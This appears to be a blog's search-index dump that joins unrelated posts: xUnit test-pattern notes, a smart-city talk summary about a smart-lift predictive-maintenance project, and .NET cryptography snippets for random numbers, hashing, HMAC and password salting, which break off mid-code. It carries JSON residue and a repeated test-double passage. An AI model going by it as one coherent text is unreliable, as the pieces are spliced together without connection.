determine the cause of most test failures. Manual Intervention A test requires a person to perform some manual action each time it is run. Cause: Manual Fixture Setup Symptoms: A person has to set up the test environment manually before the automated tests can be run. This activity may take the form of configuring servers, starting server processes, or running scripts to set up a Prebuilt Fixture. Cause: Manual Result Verification Symptoms: We can run the tests but they almost always pass\u2014even when we know that the SUT is not returning the correct results. Cause: Manual Event Injection Symptoms: A person must intervene during test execution to perform some manual action before the test can proceed. Slow Tests The tests take too long to run. Cause: Slow Component Usage A component of the SUT has high latency. Cause: General Fixture Symptoms: Tests are consistently slow because each test builds the same over-engineered fixture. Cause: Asynchronous Test Symptoms: A few tests take inordinately long to run; those tests contain explicit delays. Cause: Too Many Tests Symptoms: There are so many tests that they are bound to take a long time to run regardless of how fast they execute. Buggy Tests Bugs are regularly found in the automated tests. Cause: Fragile Test Cause: Obscure Test Cause: Hard-to-Test Code Developers Not Writing Tests Developers aren\u2019t writing automated tests. Cause: Not Enough Time Developers may have trouble writing tests in the time they are given to do the development. This problem could be caused by an overly aggressive development schedule or supervisors/team leaders who instruct developers, \u201cDon\u2019t waste time writing tests.\u201d Alternatively, developers may not have the skills needed to write tests efficiently and may not be allocated the time required to work their way up the learning curve. Cause: Hard-to-Test Code Cause: Wrong Test Automation Strategy Another cause of Developers Not Writing Tests may be a test environment or test automation strategy that leads to Fragile Tests or Obscure Tests that take too long to write. We need to ask the \u201cfive why\u2019s\u201d to find the root causes. Then we can address those causes and get the ship back on course. High Test Maintenance Cost Too much effort is spent maintaining existing tests. Cause: Fragile Test Cause: Obscure Test Cause: Hard-to-Test Code Production Bugs We find too many bugs during formal tests or in production. Cause: Infrequently Run Tests Symptoms: We hear that our developers aren\u2019t running the tests very often. When we ask some questions, we discover that running the tests takes too long (Slow Tests) or produces too many extraneous failures (Buggy Tests). Cause: Lost Test Symptoms: The number of tests being executed in a test suite has declined (or has not increased as much as expected). We may notice this directly if we are paying attention to test counts. Alternatively, we may find a bug that should have been caused by a test that we know exists but, upon poking around, we discover that the test has been disabled. Cause: Missing Unit Test Symptoms: All the unit tests pass but a customer test continues to fail. At some point, the customer test passed\u2014but no unit tests were written to verify the behavior of the individual classes. Then, a subsequent code change modified the behavior of one of the classes, which broke its functionality. Cause: Untested Code Symptoms: We may just \u201cknow\u201d that some piece of code in the SUT is not being exercised by any tests. Perhaps we have never seen that code execute, or perhaps we used code coverage tools to prove this fact beyond a doubt. Cause: Untested Requirement Symptoms: We may just \u201cknow\u201d that some piece of functionality is not being tested. Alternatively, we may be trying to test a piece of software but cannot see any visible functionality that can be tested via the public interface of the software. All the tests we have written pass, however. Cause: Neverfail Test Symptoms: We may just \u201cknow\u201d that some piece of functionality is not working, even though the tests for that functionality pass. When doing test-driven development, we have added a test for functionality we have not yet written but we cannot get the test to fail. Patterns Recorded Test How do we prepare automated tests for our software? We automate tests by recording interactions with the application and playing them back using a test tool. Most Recorded Test tools interact with the SUT through the user interface. Once an application is up and running and we don\u2019t expect a lot of changes to it, we can use Recorded Tests to do regression testing. If we want to use the Tests as Documentation or if we want to use the tests to drive new development, we should consider using Scripted Tests. These goals are difficult to address with commercial Recorded Test tools because most do not let us define a Higher-Level Language for the test recording. This issue can be addressed by building the Recorded Test capability into the application itself or by using Refactored Recorded Test. Scripted Test How do we prepare automated tests for our software? We automate the tests by writing test programs by hand. Scripted Tests allow us to prepare our tests before the software is developed so they can help drive the design. Unlike Recorded Tests, these tests can be either customer tests or unit tests. These test programs are often called \u201ctest scripts\u201d to distinguish them from the production code they test. An opensource framework for defining Data-Driven Tests is Fit and its wiki-based cousin, FitNesse. Canoo WebTest is another tool that supports this style of testing. In case of an existing legacy application, we can consider using Recorded Tests as a way of quickly creating a suite of regression tests that will protect us while we refactor the code to introduce testability. We can then prepare Scripted Tests for our now testable application. Data-Driven Test How do we prepare automated tests for our software? How do we reduce Test Code Duplication? We store all the information needed for each test in a data file and write an interpreter that reads the file and executes the tests. A Data-Driven Test is an ideal strategy for getting business people involved in writing automated tests. By keeping the format of the data file simple, we make it possible for the business person to populate the file with data and execute the tests without having to ask a technical person to write test code for each test. In general, xUnit is a more appropriate framework for unit testing than Fit; the reverse is true for customer tests. Test Automation Framework How do we make it easy to write and run tests written by different people? We use a framework that provides all the mechanisms needed to run the test logic so the test writer needs to provide only the test-specific logic. They can be classified into two main categories: \u201crobot user\u201d test tools and Scripted Tests. The latter category can be further subdivided into the xUnit and Data-Driven Tests families of Test Automation Frameworks. Minimal Fixture Which fixture strategy should we use? We use the smallest and simplest fixture possible for each test. Standard Fixture Which fixture strategy should we use? We reuse the design of the text fixture across the many tests. A Standard Fixture is more about attitude than about technology. It requires us to decide early on in the testing process that we will design a Standard Fixture that can be used by several or many tests rather than mining a common fixture from tests that were designed independently. Fresh Fixture Which fixture strategy should we use? Each test constructs its own brand-new test fixture for its own private use. Variation: Transient Fresh Fixture If we need to refer to the fixture from several places in the test, we should use only local variables or instance variables to refer to the fixture. In most cases we can depend on Garbage-Collected Teardown to destroy the fixture without any effort on our part. Variation: Persistent Fresh Fixture If we do end up using a Persistent Fresh Fixture, either we need to tear down the fixture or we need to take special measures to avoid the need for its teardown. We can tear down the fixture using In-line Teardown, Implicit Teardown, Delegated Teardown (see In-line Teardown), or Automated Teardown to leave the test environment in the same state as when we entered it. Shared Fixture How can we avoid Slow Tests? Which fixture strategy should we use? We reuse the same instance of the test fixture across many tests. Variation: Immutable Shared Fixture The problem with Shared Fixtures is that they lead to Erratic Tests if tests modify the Shared Fixture. Shared Fixtures violate the Independent Test principle. We can avoid this problem by making the Shared Fixture immutable; that is, we partition the fixture needed by tests into two logical parts. The first part is the stuff every test needs to have present but is never modified by any tests\u2014that is, the Immutable Shared Fixture. The second part is the objects that any test needs to modify or delete; these objects should be built by each test as Fresh Fixtures. Shared Fixture Setup: Prebuilt Fixture Lazy Setup Setup Decorator Suite Fixture Setup Chained Tests A useful trick for keeping our fixture from becoming persistent during data access layer testing is to use Transaction Rollback Teardown. To do so, we rely on the Humble Transaction Controller pattern when constructing our data access layer. That is, the code that reads or writes the database should never commit a transaction; this allows the code to be exercised by a test that rolls back the transaction to prevent any of the changes made by the SUT from being applied. Back Door Manipulation How can we verify logic independently when we cannot use a round-trip test? We set up the test fixture or verify the outcome by going through a back door (such as direct database access). Layer Test How can we verify logic independently when it is part of a layered architecture? We write separate tests for each layer of the layered architecture. Test Method Where do we put our test code? We encode each test as a single Test Method on some class. Four-Phase Test How do we structure our test logic to make what we are testing obvious? We structure each test with four distinct parts executed in sequence: fixture setup, exercise SUT, result verification, and fixture teardown. Assertion Method How do we make tests self-checking? We call a utility method to evaluate whether an expected outcome has been achieved. Single-Outcome Assertions such as fail; these take no arguments because they always behave the same way. Stated Outcome Assertions such as assertNotNull(anObjectReference) and assertTrue(aBooleanExpression); these compare a single argument to an outcome implied by the method name. Expected Exception Assertions such as assert_raises(expectedError) { codeToExecute }; these evaluate a block of code and a single expected exception argument. Equality Assertions such as assertEqual(expected, actual); these compare two objects or values for equality. Fuzzy Equality Assertions such as assertEqual(expected, actual, tolerance); these determine whether two values are \u201cclose enough\u201d to each other by using a \u201ctolerance\u201d or \u201ccomparison mask.\u201d Assertion Message How do we structure our test logic to know which assertion failed? We include a descriptive string argument in each call to an Assertion Method. Testcase Class Where do we put our test code? We group a set of related Test Methods on a single Testcase Class. Test Runner How do we run the tests? We define an application that instantiates a Test Suite Object and executes all the Testcase Objects it contains. Testcase Object How do we run the tests? We create a Command object for each test and call the run method when we wish to execute it. Test Suite Object How do we run the tests when we have many tests to run? We define a collection class that implements the standard test interface and use it to run a set of related Testcase Objects. Test Discovery How does the Test Runner know which tests to run? The Test Automation Framework discovers all tests that belong to the test suite automatically. Test Enumeration How does the Test Runner know which tests to run? The test automater manually writes the code that enumerates all tests that belong to the test suite. Test Selection How does the Test Runner know which tests to run? The Test Automation Framework selects the Test Methods to be run at runtime based on attributes of the tests. In-line Setup How do we construct the Fresh Fixture? Each Test Method creates its own Fresh Fixture by calling the appropriate constructor methods to build exactly the test fixture it requires. Delegated Setup How do we construct the Fresh Fixture? Each Test Method creates its own Fresh Fixture by calling Creation Methods from within the Test Methods. Creation Method How do we construct the Fresh Fixture? We set up the test fixture by calling methods that hide the mechanics of building ready-to-use objects behind Intent-Revealing Names. Implicit Setup How do we construct the Fresh Fixture? We build the test fixture common to several tests in the setUp method. Prebuilt Fixture How do we cause the Shared Fixture to be built before the first test method that needs it? We build the Shared Fixture separately from running the tests. Lazy Setup How do we cause the Shared Fixture to be built before the first test method that needs it? We use Lazy Initialization of the fixture to create it in the first test that needs it. Suite Fixture Setup How do we cause the Shared Fixture to be built before the first test method that needs it? We build/destroy the shared fixture in special methods called by the Test Automation Framework before/after the first/last Test Method is called. Setup Decorator How do we cause the Shared Fixture to be built before the first test method that needs it? We wrap the test suite with a Decorator that sets up the shared test fixture before running the tests and tears it down after all tests are done. Chained Tests How do we cause the Shared Fixture to be built before the first test method that needs it? We let the other tests in a test suite set up the test fixture. State Verification How do we make tests self-checking when there is state to be verified? We inspect the state of the system under test after it has been exercised and compare it to the expected state. Behavior Verification How do we make tests self-checking when there is no state to verify? We capture the indirect outputs of the SUT as they occur and compare them to the expected behavior. Custom Assertion How do we make tests self-checking when we have test-specific equality logic? How do we reduce Test Code Duplication when the same assertion logic appears in many tests? How do we avoid Conditional Test Logic? We create a purpose-built Assertion Method that compares only those attributes of the object that define test-specific equality. Delta Assertion How do we make tests self-checking when we cannot control the initial contents of the fixture? We specify assertions based on differences between the pre- and post-exercise state of the SUT. Guard Assertion How do we avoid Conditional Test Logic? We replace an if statement in a test with an assertion that fails the test if not satisfied. Unfinished Test Assertion How do we structure our test logic to avoid leaving tests unfinished? We ensure that incomplete tests fail by executing an assertion that is guaranteed to fail. Garbage-Collected Teardown How do we tear down the Test Fixture? We let the garbage collection mechanism provided by the programming language clean up after our test. Automated Teardown How do we tear down the Test Fixture? We keep track of all resources that are created in a test and automatically destroy/free them during teardown. In-line Teardown How do we tear down the Test Fixture? We include teardown logic at the end of the Test Method immediately after the result verification. Implicit Teardown How do we tear down the Test Fixture? The Test Automation Framework calls our cleanup logic in the tearDown method after every Test Method. Test Double Test Doubles to test indirect inputs and outputs How can we verify logic independently when code it depends on is unusable? How can we avoid Slow Tests? We replace a component on which the SUT depends with a \u201ctest-specific equivalent.\u201d Variation: Test Stub We use a Test Stub to replace a real component on which the SUT depends so that the test has a control point for the indirect inputs of the SUT. Its inclusion allows the test to force the SUT down paths it might not otherwise execute. We can further classify Test Stubs by the kind of indirect inputs they are used to inject into the SUT. A Responder (see Test Stub) injects valid values, while a Saboteur (see Test Stub) injects errors or exceptions Variation: Test Spy We can use a more capable version of a Test Stub, the Test Spy, as an observation point for the indirect outputs of the SUT. Like a Test Stub, a Test Spy may need to provide values to the SUT in response to method calls. The Test Spy, however, also captures the indirect outputs of the SUT as it is exercised and saves them for later verification by the test. Thus, in many ways, the Test Spy is \u201cjust a\u201d Test Stub with some recording capability. While a Test Spy is used for the same fundamental purpose as a Mock Object, the style of test we write using a Test Spy looks much more like a test written with a Test Stub. Variation: Mock Object We can use a Mock Object as an observation point to verify the indirect outputs of the SUT as it is exercised. Typically, the Mock Object also includes the functionality of a Test Stub in that it must return values to the SUT if it hasn\u2019t already failed the tests but the emphasisis on the verification of the indirect outputs. Therefore, a Mock Object is a lot more than just a Test Stub plus assertions: It is used in a fundamentally different way. Variation: Fake Object We use a Fake Object to replace the functionality of a real DOC (Dependent-on Component) in a test for reasons other than verification of indirect inputs and outputs of the SUT. Typically, a Fake Object implements the same functionality as the real DOC but in a much simpler way. While a Fake Object is typically built specifically for testing, the test does not use it as either a control point or an observation point. Variation: Dummy Object Some method signatures of the SUT may require objects as parameters. If neither the test nor the SUT cares about these objects, we may choose to pass in a Dummy Object, which may be as simple as a null object reference, an instance of the Object class, or an instance of a Pseudo-Object. In this sense, a Dummy Object isn\u2019t really a Test Double per se but rather an alternative to the value patterns Literal Value, Derived Value, and Generated Value. Variation: Procedural Test Stub A Test Double implemented in a procedural programming language is often called a \u201ctest stub,\u201d but I prefer to call it a Procedural Test Stub (see Test Stub) to distinguish this usage from the modern Test Stub variation of Test Doubles. Typically, we use a Procedural Test Stub to allow testing/debugging to proceed while waiting for other code to become available. It is rare for these objects to be \u201cswapped in\u201d at runtime but sometimes we make the code conditional on a \u201cDebugging\u201d flag\u2014a form of Test Logic in Production. Test Stub How can we verify logic independently when it depends on indirect inputs from other software components? We replace a real object with a test-specific object that feeds the desired indirect inputs into the system under test. Test Spy How do we implement Behavior Verification? How can we verify logic independently when it has indirect outputs to other software components? We use a Test Double to capture the indirect output calls made to another component by the SUT for later verification by the test. Mock Object How do we implement Behavior Verification for indirect outputs of the SUT? How can we verify logic independently when it depends on indirect inputs from other software components? We replace an object on which the SUT depends on with a test-specific object that verifies it is being used correctly by the SUT. Fake Object How can we verify logic independently when depended-on objects cannot be used? How can we avoid Slow Tests? We replace a component that the SUT depends on with a much lighter-weight implementation. Configurable Test Double How do we tell a Test Double what to return or expect? We configure a reusable Test Double with the values to be returned or verified during the fixture setup phase of a test. Hard-Coded Test Double How do we tell a Test Double what to return or expect? We build the Test Double by hard-coding the return values and/or expected calls. Test-Specific Subclass How can we make code testable when we need to access private state of the SUT? We add methods that expose the state or behavior needed by the test to a subclass of the SUT. Named Test Suite How do we run the tests when we have arbitrary groups of tests to run? We define a test suite, suitably named, that contains a set of tests that we wish to be able to run as a group. Example: smoke test Test Utility Method How do we reduce Test Code Duplication? We encapsulate the test logic we want to reuse behind a suitably named utility method. Parameterized Test How do we reduce Test Code Duplication when the same test logic appears in many tests? We pass the information needed to do fixture setup and result verification to a utility method that implements the entire test life cycle. Testcase Class per Class How do we organize our Test Methods onto Testcase Classes? We put all the Test Methods for one SUT class onto a single Testcase Class. Testcase Class per Feature How do we organize our Test Methods onto Testcase Classes? We group the Test Methods onto Testcase Classes based on which testable feature of the SUT they exercise. Testcase Superclass Where do we put our test code when it is in reusable Test Utility Methods? We inherit reusable test-specific logic from an abstract Testcase Super class. Test Helper Where do we put our test code when it is in reusable Test Utility Methods? We define a helper class to hold any Test Utility Methods we want to reuse in several tests. Database Sandbox How do we develop and test software that depends on a database? We provide a separate test database for each developer or tester. Unfortunately, a database is a primary cause of Erratic Tests due to the fact that data may persist between tests. A Database Sandbox is one way to keep the tests from interacting by accidentally accessing the same records in the database. When there is any way to test without a database, test without the database! What kinds of database tests will we require? The answer to this question depends on how our application uses the database. If we have stored procedures, we should write unit tests to verify their logic. If a data access layer hides the database from the business logic, we should write tests for the data access functionality. Another way to tear down any changes made to the database during the fixture setup and exercise SUT phases of the test is Table Truncation Teardown. This \u201cbrute force\u201d technique for deleting data works only when each developer has his or her own Database Sandbox and we want to clear out all the data in one or more tables. Stored Procedure Test How can we verify logic independently when we have stored procedures? We write Fully Automated Tests for each stored procedure. Table Truncation Teardown How do we tear down the Test Fixture when it is in a relational database? We truncate the tables modified during the test to tear down the fixture. Variation: Lazy Teardown => We simply issue the table truncation commands during fixture setup before setting up the new fixture. Transaction Rollback Teardown How do we tear down the Test Fixture when it is in a relational database? We roll back the uncommitted test transaction as part of the teardown. Dependency Injection How do we design the SUT so that we can replace its dependencies at runtime? The client provides the depended-on object to the SUT. The use of Singletons can be avoided through the use of an IOC tool or a manually coded Dependency Injection mechanism. Constructor Injection Parameter Injection Object Factory Service Locator Dependency Lookup How do we design the SUT so that we can replace its dependencies at runtime? The SUT asks another object to return the depended-on object before it uses it. Humble Object How can we make code testable when it is too closely coupled to its environment? We extract the logic into a separate, easy-to-test component that is decoupled from its environment. Test Hook How do we design the SUT so that we can replace its dependencies at runtime? We modify the SUT to behave differently during the test. Literal Value How do we specify the values to be used in tests? We use literal constants for object attributes and assertions. BigDecimal expectedTotal = new BigDecimal(\"99.95\"); Derived Value How do we specify the values to be used in tests? We use expressions to calculate values that can be derived from other values. BigDecimal expectedTotal = itemPrice.multiply(QUANTITY); Generated Value How do we specify the values to be used in tests? We generate a suitable value each time the test is run. BigDecimal uniqueCustomerNumber = getUniqueNumber(); Dummy Object How do we specify the values to be used in tests when the only usage is as irrelevant arguments of SUT method calls? We pass an object that has no implementation as an argument of a method called on the SUT.

Four specific goals answer this question: They must be Fully Automated Tests so they can be run without any effort. They must be Self-Checking Tests so they can detect and report any errors without manual inspection. They must be Repeatable Tests so they can be run multiple times with the same result. Ideally, each test should be an Independent Test that can be run by itself. Our tests should be small and test one thing at a time. The major exception to the mandate to keep Test Methods short occurs with customer tests that express real usage scenarios of the application. Such extended tests offer a useful way to document how a potential user of the software would go about using it; if these interactions involve long sequences of steps, the Test Methods should reflect this reality.","title":"Easy to run tests"},{"location":"2017/xunit_test_patterns/#purpose-of-tests","text":"Customer tests Verify the behavior of the entire system or application. They typically correspond to scenarios of one or more use cases, features, or user stories. These tests often go by other names such as functional tests, acceptance tests, or end-user tests. Although they may be automated by developers, their key characteristic is that an end user should be able to recognize the behavior specified by the test even if the user cannot read the test representation. Unit tests Verify the behavior of a single class or method that is a consequence of a design decision. This behavior is typically not directly related to the requirements except when a key chunk of business logic is encapsulated within the class or method in question. These tests are written by developers for their own use; they help developers describe what \u201cdone looks like\u201d by summarizing the behavior of the unit in the form of tests. Component tests Verify components consisting of groups of classes that collectively provide some service. They fit somewhere between unit tests and customer tests in terms of the size of the SUT (System under test) being verified. Although some people call these \u201cintegration tests\u201d or \u201csubsystem tests,\u201d those terms can mean something entirely different from \u201ctests of a specific larger-grained subcomponent of the overall system.\u201d Fault insertion tests Typically show up at all three levels of granularity within these functional tests, with different kinds of faults being inserted at each level. From a test automation strategy point of view, fault insertion is just another set of tests at the unit and component test levels. Things get more interesting at the whole-application level, however. Inserting faults here can be hard to automate because it is challenging to automate insertion of the faults without replacing parts of the application. Property Tests Performance tests verify various \u201cnonfunctional\u201d (also known as \u201cextra-functional\u201d or \u201ccross-functional\u201d) requirements of the system. These requirements are different in that they span the various kinds of functionality. They often correspond to the architectural \u201c-ilities.\u201d These kinds of tests include Response time tests Capacity tests Stress tests From a test automation perspective, many of these tests must be automated (at least partially) because human testers would have a hard time creating enough load to verify the behavior under stress. While we can run the same test many times in a row in xUnit, the xUnit framework is not particularly well suited to automating performance tests. Usability Tests Usability tests verify \u201cfitness for purpose\u201d by confirming that real users can use the software application to achieve the stated goals. These tests are very difficult to automate because they require subjective assessment by people regarding how easy it is to use the SUT. For this reason, usability tests are rarely automated and will not be discussed further in this book. Exploratory Testing Exploratory testing is a way to determine whether the product is self-consistent. The testers use the product, observe how it behaves, form hypotheses, design tests to verify those hypotheses, and exercise the product with them. By its very nature, exploratory testing cannot be automated, although automated tests can be used to set up the SUT in preparation for doing exploratory testing.","title":"Purpose of Tests"},{"location":"2017/xunit_test_patterns/#tests-and-continuous-integration","text":"By organizing the unit tests and customer tests into separate test suites, we ensure that we can run just the unit tests or just the customer tests if necessary. The unit tests should always pass before we check them in. To ensure that the unit tests are run frequently, we can include them in the Smoke Tests that are run as part of the Integration Build.

In this case, a test can be run as part of a suite but cannot be run by itself because it depends on something in a Shared Fixture that was created by another test or by suite-level fixture setup logic. We can address this problem by converting the test to use a Fresh Fixture or by adding Lazy Setup logic to the Lonely Test to allow it to run by itself.

Cause: Data Sensitivity Data Sensitivity occurs when a test fails because the data being used to test the SUT has been modified. This sensitivity most commonly arises when the contents of the test database change. Cause: Context Sensitivity Context Sensitivity occurs when a test fails because the state or behavior of the context in which the SUT executes has changed in some way. Cause: Overspecified Software A test says too much about how the software should be structured or behave. This form of Behavior Sensitivity is associated with the style of testing called Behavior Verification. It is characterized by extensive use of Mock Objects to build layer-crossing tests. The main issue is that the tests describe how the software should do something, not what it should achieve. That is, the tests will pass only if the software is implemented in a particular way. This problem can be avoided by applying the principle Use the Front Door First whenever possible to avoid encoding too much knowledge about the implementation of the SUT into the tests. Cause: Sensitive Equality Objects to be verified are converted to strings and compared with an expected string. This is an example of Behavior Sensitivity in that the test is sensitive to behavior that it is not in the business of verifying. We could also think of it as a case of Interface Sensitivity where the semantics of the interface have changed. Either way, the problem arises from the way the test was coded; using the string representations of objects for verifying them against expected values is just asking for trouble.

How can we avoid Slow Tests? We replace a component on which the SUT depends with a \u201ctest-specific equivalent.\u201d Variation: Test Stub We use a Test Stub to replace a real component on which the SUT depends so that the test has a control point for the indirect inputs of the SUT. Its inclusion allows the test to force the SUT down paths it might not otherwise execute. We can further classify Test Stubs by the kind of indirect inputs they are used to inject into the SUT. A Responder (see Test Stub) injects valid values, while a Saboteur (see Test Stub) injects errors or exceptions Variation: Test Spy We can use a more capable version of a Test Stub, the Test Spy, as an observation point for the indirect outputs of the SUT. Like a Test Stub, a Test Spy may need to provide values to the SUT in response to method calls. The Test Spy, however, also captures the indirect outputs of the SUT as it is exercised and saves them for later verification by the test. Thus, in many ways, the Test Spy is \u201cjust a\u201d Test Stub with some recording capability. While a Test Spy is used for the same fundamental purpose as a Mock Object, the style of test we write using a Test Spy looks much more like a test written with a Test Stub. Variation: Mock Object We can use a Mock Object as an observation point to verify the indirect outputs of the SUT as it is exercised. Typically, the Mock Object also includes the functionality of a Test Stub in that it must return values to the SUT if it hasn\u2019t already failed the tests but the emphasisis on the verification of the indirect outputs. Therefore, a Mock Object is a lot more than just a Test Stub plus assertions: It is used in a fundamentally different way. Variation: Fake Object We use a Fake Object to replace the functionality of a real DOC (Dependent-on Component) in a test for reasons other than verification of indirect inputs and outputs of the SUT. Typically, a Fake Object implements the same functionality as the real DOC but in a much simpler way. While a Fake Object is typically built specifically for testing, the test does not use it as either a control point or an observation point. Variation: Dummy Object Some method signatures of the SUT may require objects as parameters. If neither the test nor the SUT cares about these objects, we may choose to pass in a Dummy Object, which may be as simple as a null object reference, an instance of the Object class, or an instance of a Pseudo-Object. In this sense, a Dummy Object isn\u2019t really a Test Double per se but rather an alternative to the value patterns Literal Value, Derived Value, and Generated Value. Variation: Procedural Test Stub A Test Double implemented in a procedural programming language is often called a \u201ctest stub,\u201d but I prefer to call it a Procedural Test Stub (see Test Stub) to distinguish this usage from the modern Test Stub variation of Test Doubles.

The conference was hold in Suntec and it was a big event around hundreds people participated. I managed to convey the following messages in my talk: What is smart city Why AI is relevant What DNVGL has done and what we can offer to the market. This is a picture of my presentation. And in this blog, I will briefly introduce the relevant content. Table of Contents Why Cities need to be smart? According to statistics, urbanization is increasing world-wide and it also bring challenges: By 2050 cities will accommodate about 66% percent of the world's population In 2012 cities occupied only about 3% of the global land area In 2012 cities consumed about 75% of natural resources In 2012 cities produced 60%-80% of all greenhouse gas (GHG) emissions In order to address the above challenges, new and efficient ways have to be found for city operation. According to investigation from Cisco, there are improvements potential on many city operation aspects. In order to be more efficient to operate city, we need to rely on digital way to have better insight of infrastructure status, automate operation to replace repetitive human work, take better action based on historical data, optimize infrastructure efficiency, etc. The crucial parts of the digital way are to get the data, manage the data, bring value from the data, and take action accordingly. We call this new way of operating city as 'Smart city', which is mainly a data business. Data from cities The Smart city business all starts from data. In order to find a better way to operate city, first you need to understand how the city is operating. Everyone in the cities is generating new data every day, e.g. shopping records, register personal data online, medical data etc. It is huge amount of data set from human being. With the boost of IoT technology, we predict even more data will come from sensors than human being. We see cheaper sensors, faster network, better toolset will be the trend, and much more data will be collected in an automatic manner. Yes, it is big data problem! In order to process the big data, we need high automation level and new ways of processing. AI technology needs to be adopted. Even though AI is mainly about data analytics part, without proper data acquisition, data management, data visualization, it will be difficult to succeed. Why AI is relevant? The first question maybe deserve answering is what is AI. According to definition on wikipedia, AI means: Any device that perceives its environment and takes actions that maximize its chance of successfully achieving its goals. To put it simple, it is to get the data, do analytics then facilitate better decision making. Still it is data business, it is all about data. There are different ways to categorize AI technology: Classical rule based AI, Machine Learning, Deep learning Supervised and unsupervised learning depends on whether the data is labled or not Regression or classification depends on whether the label is continuous or not In-house algorithm or cloud SaaS services I am pretty sure there are other ways to categorize AI, and I do not want to be too technical in this blog and will talk about more in later blogs. One thing worth mentioning is all the above AI technical choices are relevant to Smart city context which depends on detailed scenario. DNVGL's Smart city footprint DNVGL recently setup a digital hub in Singapore aimed at digitising for our traditional industry sectors like oil and gas, maritime and energy. At the meantime, we are also trying to 'penetrate' into the smart city market. You can have a check of following news: https://sg.channelasia.tech/article/646408/solution-provider-dnv-gl-launches-digital-hub-singapore/ On the competence wise, the digital hub has mixed competence: Data analytics Software development IoT and domain knowledge in various industry sectors Smart city is a big concept, digital hub Singapore mainly focus on the following areas: Infrastructure performance Climate change Cyber security I will introduce you what we have done and our offerings in the following parts. Infrastructure performance We see aging infrastructures in the cities. In order to address the pressure from urbanization, there is need to extend the life cycle of infrastructure. Energy consumption is also a big challenge for cities with increasing population, how to reduce the energy consumption is a big topic. To maintenance the infrastructure also requires a lot of effort, we need to find a way to reduce the operational cost. And how to improve the efficiency of infrastructures like electric grid, ports, transportation systems will be important for big cities. Digital hub Singapore completes a smart lift project, I will introduce the high level concept in the following part. Smart Lift There are 61,000 lifts in Singapore. The total number of lifts is projected to double to 121,100 in the next 10 years. These days, the lift maintenance work is mainly done by human being. Imaging if you want to understand the status of the lifts, you have to invite lift technician to the site, open the lifts, then do the measurement. It is also required that the lifts need to be checked regularly. It is expensive to do the check and some times, lift break down in-between the regular checks, and measurement results are inaccurate sometimes. The smart lift project is to address the above challenge. The main purpose of smart lift project is to do predictive maintenance by utlizing IoT and anomaly detection technology. We installed laser, vibration, current, temperature, humidity sensors on lift car top and lift motor room. The raw data will be pre-processed in the gateway, then send to server for further processing. The main metrics we are measuring is peak speed during trip, levelling issues, door operation, car vibration, etc. The methodology of anomaly detection, which belongs to unsupervised learning. To put it simple, it figures out the normal pattern from operation data first. Then use the pattern to detect anomaly in the future. Once anomaly is detected, then further analysis will start to see whether to send alert to users or not. Besides that, we also provide trending chart to see whether the operational data e.g. levelling is on the right direction or not. In fact, we believes the methodology we use in smart lift project applies for all kinds of smart city projects and data driven projects. We see big potential to consolidate the framework and make future development much more efficient. Digital Twin DNVGL has adopted digital twin concept in existing industries, e.g. Maritime. We will introduce the digital twin for the smart lift too. Digital twin refers to a digital replica of physical assets. The digital representation provides both the elements and the dynamics of how an Internet of things device operates and lives throughout its life cycle. For the smart lift, the digital twin means the data sychornization between physical space and digital space. We introduce 3d viewer and dashboard to make it much easier for the users to do monitoring the system and trouble shooting. Edge Computing We see edge computing is playing important role in smart lift project. Edge computing can address the following issues: Reduce operational cost by reducing the data transferred Take actions for urgent issues by avoiding back-and-forth communication Do data processing for offline scenario Address some scenario requires high data sampling resolution If we take a look of the amount of data generated from lift: +-----------------------+-----------------------------------+-----------------------------------+ | Number of lifts | Time period | Data size | +-----------------------+-----------------------------------+-----------------------------------+ | 1 | 0.1 second | 360 bytes | +-----------------------+-----------------------------------+-----------------------------------+ | 1 | 1 day | 311 MB | +-----------------------+-----------------------------------+-----------------------------------+ | 10 | 1 day | 3 GB | +-----------------------+-----------------------------------+-----------------------------------+ | 100 | 1 day | 30 GB | +-----------------------+-----------------------------------+-----------------------------------+ | 100 | 1 month | 1 TB | +-----------------------+-----------------------------------+-----------------------------------+ | 60, 000 | 1 month | 600 TB | +-----------------------+-----------------------------------+-----------------------------------+ As you can see the big amount of data will cause pressure on the computational power and also increase the operational cost. And we also find out in order to detect anomaly in some scenario, we need 10 times higher sampling resolution than the normal ones. If we increase the communication sampling resolution, it will cause data loss and also increase cost a lot. Edge computing can definitely help a lot. For climate change and information security, which are big topics too. I will write another blog to introduce them.

Table of Contents Randomness System.Random and its problems System.Random is a pseudo random number generator A seed value is passed into the constructor The seed value should be different each time System.Random is deterministic and predictable Solution is to use RNGCryptoServiceProvider instead. public static byte[] GenerateRandomNumber(int length) { using (var randomNumberGenerator = new RNGCryptoServiceProvider()) { var randomNumber = new byte[length]; randomNumberGenerator.GetBytes((randomNumber)); return randomNumber; } Hashing What Is Hashing? It is easy to compute the hash value for any given message It is infeasible to generate a message that has a given hash It is infeasible to modify a message without changing the hash It is infeasible to find two different messages with the same hash Hash algorithm MD5 SHA-1 SHA-256 SHA-512 Hashing is one way operation, while encryption is two way operation. MD5 Designed by Ron Rivest in 1991 to replace MD4 Produces a 128 bit (16 byte) hash value Commonly used to verify file integrity First collision resistance flaw found in 1996 Recommendation was to move over to the Secure Hash Family Further collision resistance problems found in 2004 Still needed when integrating with legacy systems SHA1 SHA2: SHA256, SHA512 SHA3: not supported in .net so far (2015) public class HashData { public static byte[] ComputeHashSha1(byte[] toBeHashed) { using (var sha1 = SHA1.Create()) { return sha1.ComputeHash(toBeHashed); } } public static byte[] ComputeHashSha256(byte[] toBeHashed) { using (var sha256 = SHA256.Create()) { return sha256.ComputeHash(toBeHashed); } } public static byte[] ComputeHashSha512(byte[] toBeHashed) { using (var sha512 = SHA512.Create()) { return sha512.ComputeHash(toBeHashed); } } public static byte[] ComputeHashMd5(byte[] toBeHashed) { using (var md5 = MD5.Create()) { return md5.ComputeHash(toBeHashed); } } } Hash algorithm with key Hashed Message Authentication Codes public class Hmac { private const int KeySize = 32; public static byte[] GenerateRandomKey() { using (var randomNumberGenerator = new RNGCryptoServiceProvider()) { var randomNumber = new byte[KeySize]; randomNumberGenerator.GetBytes((randomNumber)); return randomNumber; } } public static byte[] ComputeHmacsha256(byte[] toBeHashed, byte[] key) { using (var hmac = new HMACSHA256(key)) { return hmac.ComputeHash(toBeHashed); } } public static byte[] ComputeHmacsha1(byte[] toBeHashed, byte[] key) { using (var hmac = new HMACSHA1(key)) { return hmac.ComputeHash(toBeHashed); } } } Store Password Store password: store plain text and encrypted password is not good idea. Store hash since it cannot be reversed. Rainbow table contains pre-computed hash to speed up the attack. Add salt will make brute force and rainbow table attack ineffective. public class Hash { public static byte[] GenerateSalt() { const int saltLength = 32; using (var randomNumberGenerator = new 